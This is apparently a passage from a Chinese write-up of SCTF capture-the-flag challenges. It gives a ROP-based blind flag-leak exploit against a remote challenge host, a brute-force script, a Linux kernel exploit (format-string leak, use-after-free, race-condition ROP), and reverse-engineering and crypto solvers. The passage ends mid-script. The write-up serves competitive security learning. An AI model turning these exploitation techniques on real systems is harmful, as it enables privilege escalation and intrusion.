+        payload +=p64(fake_stack+0x500-0x18)
+    
+    
+    
+        p.send(payload.ljust(0xc0,"\x00"))
+    
+        payload =p64(pop_rsi_pop_pop_ret)
+        payload +=p64(0x40db31)+p64(fake_stack)*2
+        payload +=p64(pop_rdi_pop_ret)
+        payload +=p64(0)*2
+        payload +=p64(pop_rax_ret)#
+        payload +=p64(0)
+        payload +=p64(0x401165)#---read
+        payload +=p64(0)
+        payload +=p64(pop_r13_pop_pop_pop_ret)
+        payload +=p64(flag_ord)+p64(0x40d560)*3
+        payload +=p64(pop_rax_ret)
+        payload +=p64(0x40db18)
+        payload +=p64(pop_rax_ret)
+        payload +=p64(0x40db18)
+        payload +=p64(0x401002)*3
+        payload +=p64(0x402D19)
+        print "payload = ",hex(len(payload))
+        #gdb.attach(p,"b *0x402D19")
+        p.send(payload)
+        p.sendline("\x00"*0x20)
+        #p.interactive()
+    
+        start = time.time()
+        p.can_recv_raw(timeout = 3)
+        end = time.time()
+    
+        if end - start > 3:
+            print "flag[", str(num)+"]= ",chr(flag_ord+1)
+            return 1
+        else:
+            return 0
+    
+    if __name__ == '__main__':
+    
+        flag = ""
+        for num in range(1,40):
+    
+            for i in range(126,32,-1):
+                #p = process('./gadget')
+                p = remote('121.37.135.138',2102)
+                if pwn(p,num,i):
+                    flag = flag + chr(i+1)
+                    print "flag = ",flag
+                    break
+                p.close()
+            print "flag[",str(num),"]"
+    #SCTF{woww0w_y0u_1s_g4dget_m45ter}
+    
+
+flag实在太长了，我一次又一次降低我的底线
+
+![](https://p0.ssl.qhimg.com/t01e16882960c1dc821.jpg)
+
+###  Christmas Song
+
+    
+    
+    from pwn import * 
+    import string 
+    context.log_level = 'debug' 
+    io = remote('124.71.144.133', 2144) 
+    s = lambda data :io.send(data) 
+    sa = lambda data1,data :io.sendafter(data1, data)
+    sl = lambda data :io.sendline(data) 
+    sla = lambda data1,data :io.sendlineafter(data1, data) 
+    r = lambda numb=4096 :io.recv(numb)
+    ru = lambda data1, drop=True :io.recvuntil(data1, drop)
+    rn = lambda numb :io.recvn(numb)
+    irt = lambda :io.interactive()
+    # misc functions
+    uu32 = lambda data :u32(data.ljust(4, b'\0'))
+    uu64 = lambda data :u64(data.ljust(8, b'\0'))
+    leak = lambda name,addr :log.success('{} : {:#x}'.format(name, addr))
+    io.close()
+    prefix = 'SCTF{'
+    index = 6
+    
+    stringset = string.printable
+    
+    while True:
+    for i in stringset:
+    teststr = prefix + i
+    #io = remote('124.71.144.133', 2144)
+    io=process("python3 server.py".split(" "))
+    c=""
+    c+="gift tmp is 0;\n"
+    c+="gift foo is 30;\n"
+    c+="gift fd is 0;\n"
+    c+="gift buff is \"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\";\n"
+    c+="gift path is \"/home/ctf/flag\";\n"
+    c+="gift teststr is \"{0}\";\n".format(teststr)
+    c+="gift result is 1;\n"
+    c+="gift index is {0};\n".format(index)
+    c+="reindeer Dancer delivering gift path tmp tmp brings back gift fd;\n"
+    c+="reindeer Dasher delivering gift fd buff foo;\n"
+    c+="reindeer Prancer delivering gift buff teststr index brings bac k gift result;\n"
+    c+="this family wants gift result if the gift is result equal to t mp : reindeer Rudolph delivering gift fd buff foo;\n"
+    c+="ok, they should already have a gift;\n"
+    c+="EOF\n"
+    ru('(EOF to finish):')
+    s(c)
+    try :
+    io.recvuntil('error:')
+    except EOFError:
+    io.close()
+    else:
+    prefix =teststr
+    index += 1
+    io.close()
+    break
+    
+
+###  flying_kernel
+
+格式化字符串泄露kernel地址
+
+uaf劫持subprocess_info结构体
+
+条件竞争劫持cleanup指针进行ROP
+
+内核文件读写输出flag
+
+    
+    
+    #include <stdio.h>
+    #include <fcntl.h>
+    #include <stdlib.h>
+    #include <string.h>
+    #include <stdint.h>
+    #include <unistd.h>
+    #include <pthread.h>
+    #include <time.h>
+    #include <sys/ioctl.h>
+    #include <sys/mman.h>
+    #include <sys/wait.h>
+    #include <sys/socket.h>
+    
+    size_t kernel_base,pop_rdi,filp_open,vfs_read,pop_rdx,pop_rsi,pop_rcx,xchg_eax_esp;
+    size_t buf[0x10];
+    
+    void gadget()
+    {
+        pop_rdi=kernel_base+0x16e9;
+        pop_rdx=kernel_base+0x4abb7;
+        pop_rsi=kernel_base+0x2568;
+        pop_rcx=kernel_base+0x1ed83;
+        filp_open=kernel_base+0x1dc160;
+        vfs_read=kernel_base+0x1dfc10;
+        xchg_eax_esp=kernel_base+0x11cb0;
+        memset(buf,0,sizeof(buf));
+        buf[1]=xchg_eax_esp;
+    }
+    
+    void *thread(void *thread_arg)
+    {
+        clock_t start=clock();
+        while (1)
+        {
+            write(*(int *)thread_arg,(char *)buf,0x30);
+            if (clock()-start>=CLOCKS_PER_SEC*0.5) break;
+        }
+    }
+    
+    void *thread_leak(void *thread_arg)
+    {
+        while (1)
+        {
+            puts((char *)thread_arg);
+        }
+    }
+    
+    char *ROP()
+    {
+        size_t *user_page=mmap((void *)(xchg_eax_esp&0xFFFFF000),0x1000,PROT_READ|PROT_WRITE,MAP_ANONYMOUS|MAP_PRIVATE,-1,0);
+        int i=0x196;
+        user_page[i++]=pop_rdi;
+        user_page[i++]=(size_t)(user_page-0x10);
+        user_page[i++]=kernel_base+0x6892f8;
+        user_page[i++]=pop_rdi;
+        user_page[i++]=(size_t)"/flag";
+        user_page[i++]=pop_rsi;
+        user_page[i++]=0;
+        user_page[i++]=pop_rdx;
+        user_page[i++]=0;
+        user_page[i++]=filp_open;
+        user_page[i++]=kernel_base+0x65afac;
+        user_page[i++]=pop_rsi;
+        user_page[i++]=(size_t)user_page;
+        user_page[i++]=pop_rdx;
+        user_page[i++]=0x100;
+        user_page[i++]=pop_rcx;
+        user_page[i++]=(size_t)user_page+0x800;
+        user_page[i++]=vfs_read;
+        return (char *)user_page;
+    }
+    
+    int main()
+    {
+        int fd=open("/dev/seven",O_RDWR);
+        ioctl(fd,0x5555,0x80);
+        write(fd,"%lx\n%lx\n%lx\n%lx\n%lx\n%lx\n",0x80);
+        ioctl(fd,0x7777,NULL);
+        ioctl(fd,0x7777,NULL);
+        scanf("%lx",&kernel_base);
+        kernel_base=kernel_base-0x1f3ecd;
+        gadget();
+        char *flag_addr=ROP();
+        ioctl(fd,0x5555,0x80);
+        ioctl(fd,0x6666,NULL);
+    
+        pthread_t thread_pid;
+        pthread_create(&thread_pid,NULL,thread,&fd);
+        pthread_t thread_leak_pid;
+        pthread_create(&thread_leak_pid,NULL,thread_leak,flag_addr);
+    
+        for (int i=0; i<0x10; i++) socket(22,AF_INET,0);
+    
+        pthread_join(thread_pid,NULL);
+    
+    
+    
+    }
+    
+
+## Re
+
+###  godness dance
+
+逆向发现是计数排序，5f80数组存放每个字符出现次数
+
+![](https://p1.ssl.qhimg.com/t010db8740bcd5f8da5.png)
+
+sub1400是计数排序函数，存放一组以ascii码排序的字符串
+
+![](https://p3.ssl.qhimg.com/t010d2be9e295b620d3.png)
+
+计算后的结果和4020数组比较，得到flag
+
+    
+    
+    data = [2, 26, 17, 28, 24, 11, 21, 10, 16, 20, 19, 18, 3, 8, 6, 12, 9, 14, 13, 22, 4, 27, 15, 23, 1, 25, 7, 5]
+    data = [i - 1 for i in data]
+    origin = 'abcdefghiijklmnopqrorigintuuvwxyz'
+    result = [0] * 28
+    for i in range(len(data)):
+        result[data[i]] = origin[i]
+    print(''.join(result))
+    
+
+SCTF{waltznymphforquickjigsvexbud}
+
+###  CplusExceptionEncrypt
+
+以异常来驱动执行的题。
+
+分组加密，16个字节一组。先进行一个魔改tea加密，接着将密文与tea的deltea进行异或，最后一个魔改aes加密（主要就是将重复轮的字节替换和行移位改为逆字节替换和逆移位）
+
+先进行魔改aes解密：
+
+    
+    
+    //aes.h
+    #ifndef AES_H
+    #define AES_H
+    
+    #include <string.h>
+    #include <stdio.h>
+    #include <iostream> 
+    
+    #define Nk 4
+    #define Nr 10
+    #define Nb 4
+    #define getSBoxValue(num) (sbox[(num)])
+    
+    class aes
+    {
+    public:
+        struct ctx_
+        {
+            unsigned char RoundKey[11*16];
+        }ctx;
+    
+    public:
+        aes(char *Key);
+        void xor_iv(char *a, char *b);
+        void KeyExpansion(unsigned char *RoundKey, char *Key);
+        void AddRoundKey(unsigned char (*state)[4], unsigned char *RoundKey);
+        void ShiftRows(unsigned char (*state)[4]);
+        unsigned char gfmultby(unsigned char a, unsigned char b);
+        void getData(unsigned char (*data)[4], char *enc);
+        void encryption_cbc(char *plaint, char *enc);
+        void InvSubBytes(unsigned char (*state)[4]);
+        void InvSubBytes1(unsigned char (*state)[4]);
+        void InvShiftRows(unsigned char (*state)[4]);
+        void InvMixColumns(unsigned char (*state)[4]);
+        void decryption_cbc(char *plaint, char *enc);
+    };
+    
+    #endif // AES_H
+    
+    
+    //main.cpp
+    #include "aes.h"
+    
+    using namespace std;
+    
+    const unsigned char sbox[256] = {
+      //0     1    2      3     4    5     6     7      8    9     A      B    C     D     E     F
+      0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5, 0x30, 0x01, 0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76, 0xCA, 0x82, 0xC9, 0x7D, 0xFA, 0x59, 0x47, 0xF0, 0xAD, 0xD4, 0xA2, 0xAF, 0x9C, 0xA4, 0x72, 0xC0, 0xB7, 0xFD, 0x93, 0x26, 0x36, 0x3F, 0xF7, 0xCC, 0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31, 0x15, 0x04, 0xC7, 0x23, 0xC3, 0x18, 0x96, 0x05, 0x9A, 0x07, 0x12, 0x80, 0xE2, 0xEB, 0x27, 0xB2, 0x75, 0x09, 0x83, 0x2C, 0x1A, 0x1B, 0x6E, 0x5A, 0xA0, 0x52, 0x3B, 0xD6, 0xB3, 0x29, 0xE3, 0x2F, 0x84, 0x53, 0xD1, 0x00, 0xED, 0x20, 0xFC, 0xB1, 0x5B, 0x6A, 0xCB, 0xBE, 0x39, 0x4A, 0x4C, 0x58, 0xCF, 0xD0, 0xEF, 0xAA, 0xFB, 0x43, 0x4D, 0x33, 0x85, 0x45, 0xF9, 0x02, 0x7F, 0x50, 0x3C, 0x9F, 0xA8, 0x51, 0xA3, 0x40, 0x8F, 0x92, 0x9D, 0x38, 0xF5, 0xBC, 0xB6, 0xDA, 0x21, 0x10, 0xFF, 0xF3, 0xD2, 0xCD, 0x0C, 0x13, 0xEC, 0x5F, 0x97, 0x44, 0x17, 0xC4, 0xA7, 0x7E, 0x3D, 0x64, 0x5D, 0x19, 0x73, 0x60, 0x81, 0x4F, 0xDC, 0x22, 0x2A, 0x90, 0x88, 0x46, 0xEE, 0xB8, 0x14, 0xDE, 0x5E, 0x0B, 0xDB, 0xE0, 0x32, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x5C, 0xC2, 0xD3, 0xAC, 0x62, 0x91, 0x95, 0xE4, 0x79, 0xE7, 0xC8, 0x37, 0x6D, 0x8D, 0xD5, 0x4E, 0xA9, 0x6C, 0x56, 0xF4, 0xEA, 0x65, 0x7A, 0xAE, 0x08, 0xBA, 0x78, 0x25, 0x2E, 0x1C, 0xA6, 0xB4, 0xC6, 0xE8, 0xDD, 0x74, 0x1F, 0x4B, 0xBD, 0x8B, 0x8A, 0x70, 0x3E, 0xB5, 0x66, 0x48, 0x03, 0xF6, 0x0E, 0x61, 0x35, 0x57, 0xB9, 0x86, 0xC1, 0x1D, 0x9E, 0xE1, 0xF8, 0x98, 0x11, 0x69, 0xD9, 0x8E, 0x94, 0x9B, 0x1E, 0x87, 0xE9, 0xCE, 0x55, 0x28, 0xDF, 0x8C, 0xA1, 0x89, 0x0D, 0xBF, 0xE6, 0x42, 0x68, 0x41, 0x99, 0x2D, 0x0F, 0xB0, 0x54, 0xBB, 0x16 };
+    
+    //const unsigned char rsbox[] = {0x52, 0x09, 0x6A, 0xD5, 0x30, 0x36, 0xA5, 0x38, 0xBF, 0x40, 0xA3, 0x9E, 0x81, 0xF3, 0xD7, 0xFB, 0x7C, 0xE3, 0x39, 0x82, 0x9B, 0x2F, 0xFF, 0x87, 0x34, 0x8E, 0x43, 0x44, 0xC4, 0xDE, 0xE9, 0xCB, 0x54, 0x7B, 0x94, 0x32, 0xA6, 0xC2, 0x23, 0x3D, 0xEE, 0x4C, 0x95, 0x0B, 0x42, 0xFA, 0xC3, 0x4E, 0x08, 0x2E, 0xA1, 0x66, 0x28, 0xD9, 0x24, 0xB2, 0x76, 0x5B, 0xA2, 0x49, 0x6D, 0x8B, 0xD1, 0x25, 0x72, 0xF8, 0xF6, 0x64, 0x86, 0x68, 0x98, 0x16, 0xD4, 0xA4, 0x5C, 0xCC, 0x5D, 0x65, 0xB6, 0x92, 0x6C, 0x70, 0x48, 0x50, 0xFD, 0xED, 0xB9, 0xDA, 0x5E, 0x15, 0x46, 0x57, 0xA7, 0x8D, 0x9D, 0x84, 0x90, 0xD8, 0xAB, 0x00, 0x8C, 0xBC, 0xD3, 0x0A, 0xF7, 0xE4, 0x58, 0x05, 0xB8, 0xB3, 0x45, 0x06, 0xD0, 0x2C, 0x1E, 0x8F, 0xCA, 0x3F, 0x0F, 0x02, 0xC1, 0xAF, 0xBD, 0x03, 0x01, 0x13, 0x8A, 0x6B, 0x3A, 0x91, 0x11, 0x41, 0x4F, 0x67, 0xDC, 0xEA, 0x97, 0xF2, 0xCF, 0xCE, 0xF0, 0xB4, 0xE6, 0x73, 0x96, 0xAC, 0x74, 0x22, 0xE7, 0xAD, 0x35, 0x85, 0xE2, 0xF9, 0x37, 0xE8, 0x1C, 0x75, 0xDF, 0x6E, 0x47, 0xF1, 0x1A, 0x71, 0x1D, 0x29, 0xC5, 0x89, 0x6F, 0xB7, 0x62, 0x0E, 0xAA, 0x18, 0xBE, 0x1B, 0xFC, 0x56, 0x3E, 0x4B, 0xC6, 0xD2, 0x79, 0x20, 0x9A, 0xDB, 0xC0, 0xFE, 0x78, 0xCD, 0x5A, 0xF4, 0x1F, 0xDD, 0xA8, 0x33, 0x88, 0x07, 0xC7, 0x31, 0xB1, 0x12, 0x10, 0x59, 0x27, 0x80, 0xEC, 0x5F, 0x60, 0x51, 0x7F, 0xA9, 0x19, 0xB5, 0x4A, 0x0D, 0x2D, 0xE5, 0x7A, 0x9F, 0x93, 0xC9, 0x9C, 0xEF, 0xA0, 0xE0, 0x3B, 0x4D, 0xAE, 0x2A, 0xF5, 0xB0, 0xC8, 0xEB, 0xBB, 0x3C, 0x83, 0x53, 0x99, 0x61, 0x17, 0x2B, 0x04, 0x7E, 0xBA, 0x77, 0xD6, 0x26, 0xE1, 0x69, 0x14, 0x63, 0x55, 0x21, 0x0C, 0x7D};
+    
+    unsigned char rsbox[256] = {0}; 
+    
+    const unsigned char Rcon[11] = {
+      0x8d, 0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40, 0x80, 0x1b, 0x36 };
+    
+    const unsigned char MixValue[4][4] = {{02, 03, 01, 01},
+                                          {01, 02, 03, 01},
+                                          {01, 01, 02, 03},
+                                          {03, 01, 01, 02}
+    };
+    
+    
+    const unsigned char InvMixValue[4][4] = {{0xe, 0xb, 0xd, 0x9},
+                                             {0x9, 0xe, 0xb, 0xd},
+                                             {0xd, 0x9, 0xe, 0xb},
+                                             {0xb, 0xd, 0x9, 0xe}
+    };
+    
+    aes::aes(char *key)
+    {
+        this->KeyExpansion(ctx.RoundKey, key);
+    
+        for(int i = 0; i < 256; i++)
+        {
+            rsbox[sbox[i]] = i;
+        }
+    }
+    
+    void aes::xor_iv(char *data, char *iv)
+    {
+        for(int i = 0; i < 16; i++)
+            data[i] ^= iv[i];
+    }
+    
+    void aes::KeyExpansion(unsigned char *RoundKey, char *Key)
+    {
+        unsigned char i, j, k;
+        unsigned char tempa[4];
+    
+        for (i = 0; i < Nk; ++i)
+        {
+            RoundKey[(i * 4) + 0] = Key[(i * 4) + 0];
+            RoundKey[(i * 4) + 1] = Key[(i * 4) + 1];
+            RoundKey[(i * 4) + 2] = Key[(i * 4) + 2];
+            RoundKey[(i * 4) + 3] = Key[(i * 4) + 3];
+        }
+    
+        for (i = Nk; i < Nb * (Nr + 1); ++i)
+        {
+            k = (i - 1) * 4;
+            tempa[0]=RoundKey[k + 0];
+            tempa[1]=RoundKey[k + 1];
+            tempa[2]=RoundKey[k + 2];
+            tempa[3]=RoundKey[k + 3];
+    
+            if (i % Nk == 0)
+            {
+                const unsigned char u8tmp = tempa[0];
+                tempa[0] = tempa[1];
+                tempa[1] = tempa[2];
+                tempa[2] = tempa[3];
+                tempa[3] = u8tmp;
+    
+                tempa[0] = getSBoxValue(tempa[0]);
+                tempa[1] = getSBoxValue(tempa[1]);
+                tempa[2] = getSBoxValue(tempa[2]);
+                tempa[3] = getSBoxValue(tempa[3]);
+    
+                tempa[0] = tempa[0] ^ Rcon[i/Nk];
+            }
+    
+            j = i * 4; k=(i - Nk) * 4;
+            RoundKey[j + 0] = RoundKey[k + 0] ^ tempa[0];
+            RoundKey[j + 1] = RoundKey[k + 1] ^ tempa[1];
+            RoundKey[j + 2] = RoundKey[k + 2] ^ tempa[2];
+            RoundKey[j + 3] = RoundKey[k + 3] ^ tempa[3];
+        }
+    }
+    
+    void aes::AddRoundKey(unsigned char (*state)[4], unsigned char *RoundKey)
+    {
+        int i, j;
+    
+        for(i = 0; i < 4 ;i++)
+        {
+            for(j = 0; j < 4; j++)
+            {
+                state[i][j] ^= RoundKey[j*4+i];
+            }
+        }
+    }
+    
+    void aes::InvSubBytes(unsigned char (*state)[4])
+    {
+        int i, j;
+    
+        for(i = 0; i < 4; i++)
+        {
+            for(j = 0; j < 4; j++)
+            {
+                state[i][j] = rsbox[state[i][j]];
+            }
+        }
+    }
+    
+    void aes::InvSubBytes1(unsigned char (*state)[4])
+    {
+        int i, j;
+    
+        for(i = 0; i < 4; i++)
+        {
+            for(j = 0; j < 4; j++)
+            {
+                state[i][j] = sbox[state[i][j]];
+            }
+        }
+    }
+    
+    
+    void aes::InvShiftRows(unsigned char (*state)[4])
+    {
+        int i, j, cnt, tmp;
+    
+        for(i = 1; i < 4; i++)
+        {
+            cnt = 0;
+            while(cnt++ < i)
+            {
+                tmp = state[i][3];
+                for(j = 3; j > 0; j--)
+                {
+                    state[i][j] = state[i][j-1];
+                }
+                state[i][j] = tmp;
+            }
+        }
+    }
+    
+    void aes::ShiftRows(unsigned char (*state)[4])
+    {
+        int i, j, cnt, tmp;
+    
+        for(i = 1; i < 4; i++)
+        {
+            cnt = 0;
+            while(cnt++ < i)
+            {
+                tmp = state[i][0];
+                for(j = 1; j < 4; j++)
+                {
+                    state[i][j-1] = state[i][j];
+                }
+                state[i][j-1] = tmp;
+            }
+        }
+    }
+    
+    unsigned char aes::gfmultby(unsigned char a, unsigned char b)
+    {
+        unsigned char tmp = a >= 0x80 ? (unsigned char)((a<<1)^0x1b):(unsigned char)(a << 1);
+        if(b == 1)
+            return a;
+        else if(b == 2)
+            return tmp;
+        else if(b == 3)
+            return tmp^a;
+        else if(b == 4)
+            return gfmultby(tmp, 2);
+        else if(b == 8)
+            return gfmultby(gfmultby(tmp, 2), 2);
+        else if(b == 9)
+            return gfmultby(gfmultby(tmp, 2), 2)^a;
+        else if(b == 10)
+            return gfmultby(gfmultby(tmp, 2), 2)^tmp;
+        else if(b == 11)
+            return gfmultby(gfmultby(tmp, 2), 2)^tmp^a;
+        else if(b == 12)
+            return gfmultby(gfmultby(tmp, 2), 2)^gfmultby(tmp, 2);
+        else if(b == 13)
+            return gfmultby(gfmultby(tmp, 2), 2)^gfmultby(tmp, 2)^a;
+        else
+            return gfmultby(gfmultby(tmp, 2), 2)^gfmultby(tmp, 2)^tmp;
+    }
+    
+    
+    void aes::InvMixColumns(unsigned char (*state)[4])
+    {
+        int i, j, k;
+    
+        unsigned char output[4][4] = {{0}};
+    
+        for(i = 0; i < 4; i++)
+        {
+            for(j = 0; j < 4; j++)
+            {
+                for(k = 0; k < 4; k++)
+                {
+                    output[i][j] ^= gfmultby(state[k][j], InvMixValue[i][k]);
+                }
+            }
+    
+        }
+    
+        for(i = 0; i < 4; i++)
+        {
+            for(j = 0; j < 4; j++)
+            {
+                state[i][j] = output[i][j];
+            }
+        }
+    }
+    
+    void aes::getData(unsigned char (*data)[4], char *plaint)
+    {
+        int i, j;
+    
+        for(i = 0; i < 4; i++)
+        {
+            for(j = 0; j < 4; j++)
+            {
+                data[j][i] = plaint[4*i+j];
+            }
+        }
+    
+    }
+    
+    
+    void aes::decryption_cbc(char *enc, char *plain)
+    {
+        int i = 10, j = 0;
+        unsigned char state[4][4] = {{0}}, output[4][4];
+    
+        aes::getData(state, enc);
+    
+        /*for(int i = 0; i < 0xb0; i++)
+            printf("%#x, ", ctx.RoundKey[i]);
+        putchar(10);*/
+        aes::AddRoundKey(state, ctx.RoundKey+i*16);
+        for(i--; ; i--)
+        {
+            if(i == 9)    
+                aes::InvShiftRows(state);
+            else
+                aes::ShiftRows(state);
+            if(i == 9)
+                aes::InvSubBytes(state);
+            else
+                aes::InvSubBytes1(state);
+    
+            aes::AddRoundKey(state, ctx.RoundKey+i*16);
+    
+    /*        for(int a = 0; a < 4; a++)
+            {
+                for(int b = 0; b < 4; b++)
+                {
+                    printf("%#x, ", state[b][a]);
+                }
+            }
+            putchar(10);*/
+            if(i == 0)
+                break;
+            aes::InvMixColumns(state);
+        }
+    
+        for(i = 0; i < 4; i++)
+        {
+            for(j = 0; j < 4; j++)
+            {
+                output[i][j] = state[j][i];
+            }
+        }
+    
+        for(i = 0; i < 16; i++)
+            plain[i] = ((char *)output)[i];
+    
+    }
+    
+    int main(void)
+    {
+        char key[] = {87, 101, 108, 99, 111, 109, 101, 95, 116, 111, 95, 115, 99, 116, 102, 33};
+        char iv[] = {102, 102, 102, 102, 102, 102, 102, 102, 102, 102, 102, 102, 102, 102, 102, 102};
+        char plain[100] = {0};
+        //char enc[] = {0x9E, 0xD5, 0x19, 0xDB, 0xC0, 0x3D, 0x4E, 0x7B, 0x02, 0x96, 0x00, 0x8E, 0xD6, 0x59, 0x36, 0x13};
+        //char enc[] = {190, 28, 179, 243, 161, 244, 228, 99, 17, 225, 28, 107, 84, 10, 223, 116};
+        char enc[] = {242, 147, 85, 218, 72, 252, 162, 60, 137, 99, 46, 127, 141, 164, 109, 78};
+        aes *cry = new aes(key);
+    
+        putchar(10);
+        for(int i = 0; i < 16; i += 16)
+        {
+            cry->decryption_cbc(enc+i, plain+i);
+            if(i == 0)
+                cry->xor_iv(plain+i, iv);
+            else
+                cry->xor_iv(plain+i, enc+(i-16));
+        }
+    
+        for(int i = 0; i < 16; i++)
+        {
+            printf("%#x, ", (unsigned char)plain[i]);
+        }
+    
+        return 0;
+    }
+    
+
+比如得到第二组的解密数据：
+
+0xdb, 0x7c, 0x93, 0x4f, 0x6a, 0x56, 0xc5, 0x16, 0x4d, 0xe0, 0x55, 0xf7, 0x99,
+0x27, 0xa, 0xf6
+
+然后tea解密即可：
+
+    
+    
+    #include <stdio.h>
+    #include <stdlib.h>
+    
+    unsigned int k[] = {0x21667463, 0x735F6F74, 0x5F656D6F, 0x636C6557}; 
+    //unsigned char s[] = {0x7F, 0xF4, 0xB3, 0xD0, 0x25, 0x45, 0x0E, 0x60, 0x00, 0xFD, 0xB8, 0xC7, 0x80, 0x6F, 0x3F, 0xD0};
+    //unsigned char s[] = {0xa5, 0x5b, 0x93, 0xfb, 0x44, 0x98, 0x88, 0x2c, 0x22, 0x53, 0x22, 0x7e, 0xa, 0xf3, 0xcc, 0xbb};
+    unsigned char s[] = {0xdb, 0x7c, 0x93, 0x4f, 0x6a, 0x56, 0xc5, 0x16, 0x4d, 0xe0, 0x55, 0xf7, 0x99, 0x27, 0xa, 0xf6};
+    char x[] = "sctf";
+    
+    
+    int main(void)
+    {
+    /*    srand(0x53435446);
+    
+        for(int i = 0; i < 3; i++)
+        {
+            printf("%d, ", rand());
+        }*/
+        unsigned int *enc = (unsigned int *)s;
+        for(int i = 0; i < 4; i++)
+        {
+            enc[i] ^= x[i];
+            //printf("%#x, ", enc[i]);
+            putchar(10);
+        }
+        unsigned int a = enc[0], b = enc[1], c = enc[2], d = enc[3];
+    //    unsigned int a = 0x31313131, b = 0x32323232, c = 0x33333333, d = 0x34343434;
+    
+        putchar(10);
+        unsigned int sum = 0, tmp = 0;
+    
+    
+    /*    for(int i = 0; i < 32; i++)
+        {
+            sum += 0x73637466;
+            tmp = sum+i;
+            //printf("%d %#x\n", i, sum);
+            a += (((b >> 5)+k[0])^(b+sum)^((b << 4)+k[1]))^tmp;
+            b += (((a >> 5)+k[2])^(a+sum)^((a << 4)+k[3]))^tmp;
+            c += (((d >> 5)+k[0])^(d+sum)^((d << 4)+k[1]))^tmp;
+            d += (((c >> 5)+k[2])^(c+sum)^((c << 4)+k[3]))^tmp;
+    
+    
+    
+            //putchar(10);
+        }
+            printf("%#x\n", sum);
+            printf("%#x\n", a);
+            printf("%#x\n", b);
+            printf("%#x\n", c);
+            printf("%#x\n", d);
+    
+            putchar(10);*/
+        sum = 0x73637466*32;
+        for(int i = 0; i < 32; i++)
+        {
+            tmp = sum+(31-i);
+            //printf("%d %#x\n", i, sum);
+            b -= (((a >> 5)+k[2])^(a+sum)^((a << 4)+k[3]))^tmp;
+            a -= (((b >> 5)+k[0])^(b+sum)^((b << 4)+k[1]))^tmp;
+    
+            d -= (((c >> 5)+k[2])^(c+sum)^((c << 4)+k[3]))^tmp;
+            c -= (((d >> 5)+k[0])^(d+sum)^((d << 4)+k[1]))^tmp;
+            sum -= 0x73637466;
+        }
+        printf("%#x, ", a);
+        printf("%#x, ", b);
+        printf("%#x, ", c);
+        printf("%#x, ", d);
+    
+    }
+    
+
+## Crypto
+
+###  cubic
+
+扩展维纳攻击分解n得到p q，根据一般群阶p-1，复数群阶$p^{2}-1$，推导该群阶为$p^{3}-1$，直接求逆得d进行解密
+
+    
+    
+    from Crypto.Util.number import *
+    from gmpy2 import invert
+    from z3 import *
+    
+    #c =(166431982461794383404765894353564652417286281286845040815812696140245010936597690881728163044999563295606777822589599719988749943986277241768406486432942976971806090294723679213709276119783333317719736480695779056909005344748713312922208943911234004090154620267867923985496066206993388826848408016113230559895319140692117846347161636934408901418900660630848238252785792937558161125236263657446105045318374541989968623804546523311550966511721989817712979188863096534909514606855128351038197938270797429538803633123512162732858973784140131107258309968348721003718514188938837464306149466871073659419970807525573186177295974780597677202177278450017235952741828648411332753623971689087414338005032425283018127420482524353019039589883070439499816602536780385008119304807415943660538320547325663679105882323899559945539040614335041356182742492246188685166079997529059728431638477119368978924088838246744082322934215253952260604000, 583811541976786499144377377934025235584387131534635007022251365145942422227051060939985851484706210836767096516219672713844985063110538384884200155176672559391335026702801538941879468724743394010709887016418730105669706000795612301487140087279830678314909581314560039721638176230206155638477025095967507768951649990761591795801514872889641096293748540210199152367695575307597602483917419532171797268649128704295643514700599003974515092476985280147122085743107678260804403848731411523152508976557299100005180707794868709825610527244045712157278351329970986028569553983677992653806577740248777743401724460474149400544970284499843498104577389527968551869656641095498167438798405641085540418812727789234175230571563718616654865504708574325812468631975439864831103170397966449939536937839005435391565163846769907939906973391750780003117155026788680288079657919663977842795793378060965920997621456965471449613549935486637988132751)
+    #pad =117974859274346072583739577879237661359633939326177996925545772649078598610987301667759912933925662285927802009264196767594856451275711699740105534472053429854738915648249617679338619108159296653886787677835343872851980353011790571950727888130983528711607533379553800325336063577707548506215714783818842480239
+    #e1 = 2816364923215542703181103700546313680109699436794123566226755921623782970809742716991858902522746028156003630828900076158585411663702115647361928930336417992964232866389633747914430575706682691181456229019202935906062908587609722493361057620793975135051750614902337992567625486243873224234033256269675850528518211544253411469959902538438091955199793022342556708413965433779350671626129791137318004869160747756926534289668211426638719794731091512998036558584096298208598924494265349419704363061401758956080768587013310392993665629098212668360357545504145264857268152702858316846654320106999264941629532500605382044391
+    #e2 = 7688844608122166688554531210042890906331317367269721882913839185271394937163082744925864177779002472233203611799817777199710838582026800408107353934895515601449211254844714968565944446477081395969750472765835932266965229128856452781816269289992832230947973758915003020471524086758777628035741239238359503130190607998292797906572873297770527569698066692949759789487870533498458377873270494530630801359434977962847044065574759512179511120769361043269784870586239376868814910804487324802261815900392837165247623551114275644333697133133053782070322628235841247238848243632844856346687843129893451542644093889516093928419
+    #N  = 10601906187740216931595985813561018154094349391814625467866276039997784519775353384474319150269738230372047308386421763681496742534415560601792743087606061049915679247822012183530512682920721493867744110943536891780424477404764918611971479616608837196312314759612406032833626939153217353695263399529371219150113614077103843371902911156062855363330555112519824288646026162760935051435028546568477902038113029695080397072016581518542586165205453807211236256185776189563790278426435009592437384840461159406810098763820921285305532960357029603792366631504440047476973500179551679652666963735985418083518134488043693919959
+    #a  = 0.356#731./2049
+    #M1=N**0.5
+    #M2= N **(a+1)
+    #D = diagonal_matrix(ZZ,[N,M1,M2,1])
+    #M=matrix(ZZ,[[1,-N,0,N**2],[0,e1,-e1,-e1*N],[0,0,e2,-e2*N],[0,0,0,e1*e2]])*D
+    #L=M.LLL()
+    #t=vector(ZZ,L[0])
+    #x=t*M**(-1)
+    #phi = int(x[1]/x[0]*e1)
+    #print(phi)
+    #s = Solver()
+    #p=Int('p')
+    #q=Int('q')
+    #s.add(p*q == 10601906187740216931595985813561018154094349391814625467866276039997784519775353384474319150269738230372047308386421763681496742534415560601792743087606061049915679247822012183530512682920721493867744110943536891780424477404764918611971479616608837196312314759612406032833626939153217353695263399529371219150113614077103843371902911156062855363330555112519824288646026162760935051435028546568477902038113029695080397072016581518542586165205453807211236256185776189563790278426435009592437384840461159406810098763820921285305532960357029603792366631504440047476973500179551679652666963735985418083518134488043693919959)
